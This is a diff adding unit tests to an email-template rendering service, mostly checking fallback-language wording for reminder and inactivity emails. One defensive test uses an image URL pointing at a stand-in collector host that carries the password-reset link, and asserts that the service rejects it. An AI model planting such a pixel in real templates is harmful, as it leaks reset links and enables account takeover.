@@ -78,4 +78,96 @@ describe("EmailTemplateRenderingService", () => {
       ),
     ).rejects.toThrow("emailTemplates.errors.missingMandatoryVariables");
   });
+  it.each(["subject", "image"])(
+    "rejects a persisted credential leak in %s before asset resolution",
+    async (location) => {
+      const document = structuredClone(definition.defaultDocuments.en);
+      if (location === "image")
+        document.content.push({
+          type: "image",
+          attrs: { src: "https://collector.example/pixel?token={{ reset_link }}", alt: "" },
+        });
+      findPublishedEmailTemplate.mockResolvedValue({
+        subject: { en: location === "subject" ? "{{ reset_link }}" : "Reset" },
+        content: { en: document },
+        baseLanguage: SUPPORTED_LANGUAGES.EN,
+      });
+      await expect(
+        service.renderPublishedEmailTemplate("tenant-id", context, branding),
+      ).rejects.toThrow("emailTemplates.errors.restrictedAuthVariables");
+      expect(resolveEmailTemplateAssets).not.toHaveBeenCalled();
+    },
+  );
+
+  it("derives deadline wording in the actual fallback language", async () => {
+    const reminder = getEmailTemplateDefinition(EMAIL_TEMPLATE_EVENTS.COURSE_DUE_DATE_REMINDER);
+    findPublishedEmailTemplate.mockResolvedValue({
+      subject: { en: reminder.subjects.en },
+      content: { en: reminder.defaultDocuments.en },
+      baseLanguage: SUPPORTED_LANGUAGES.EN,
+    });
+    const result = await service.renderPublishedEmailTemplate(
+      "tenant-id",
+      {
+        event: reminder.event,
+        language: SUPPORTED_LANGUAGES.PL,
+        variables: {
+          course_name: "Safety",
+          course_link: "https://tenant.example/course",
+          due_date: "2026-10-01",
+          days_before_due_date: 0,
+        },
+      },
+      branding,
+    );
+    expect(result?.text).toContain('The deadline to complete course "Safety" is today.');
+  });
+  it.each([
+    EMAIL_TEMPLATE_EVENTS.USER_SHORT_INACTIVITY,
+    EMAIL_TEMPLATE_EVENTS.USER_LONG_INACTIVITY,
+  ])("uses platform wording in the fallback language for %s", async (event) => {
+    const definition = getEmailTemplateDefinition(event);
+    findPublishedEmailTemplate.mockResolvedValue({
+      subject: { en: definition.subjects.en },
+      content: { en: definition.defaultDocuments.en },
+      baseLanguage: SUPPORTED_LANGUAGES.EN,
+    });
+    const result = await service.renderPublishedEmailTemplate(
+      "tenant-id",
+      {
+        event,
+        language: SUPPORTED_LANGUAGES.PL,
+        variables: { course_name: "", course_link: "https://tenant.example/courses" },
+      },
+      branding,
+    );
+    expect(result?.text).toContain("on platform.");
+    expect(result?.text).not.toContain("activity in .");
+    expect(result?.html).not.toContain("{{");
+    if (event === EMAIL_TEMPLATE_EVENTS.USER_SHORT_INACTIVITY) {
+      expect(result?.subject).toBe("Continue your journey on the platform");
+      expect(result?.text).toContain("OPEN PLATFORM");
+    }
+  });
+
+  it("omits assignment deadline wording when the runtime date is absent", async () => {
+    const definition = getEmailTemplateDefinition(EMAIL_TEMPLATE_EVENTS.USER_ASSIGNED_TO_COURSE);
+    findPublishedEmailTemplate.mockResolvedValue({
+      subject: { en: definition.subjects.en },
+      content: { en: definition.defaultDocuments.en },
+      baseLanguage: SUPPORTED_LANGUAGES.EN,
+    });
+    const result = await service.renderPublishedEmailTemplate(
+      "tenant-id",
+      {
+        event: definition.event,
+        language: SUPPORTED_LANGUAGES.PL,
+        variables: { course_name: "Safety", course_link: "https://tenant.example/course" },
+      },
+      branding,
+    );
+    expect(result?.text).toContain("You now have access to Safety.");
+    expect(result?.text).not.toContain("mandatory");
+    expect(result?.html).not.toContain("{{");
+  });
 });
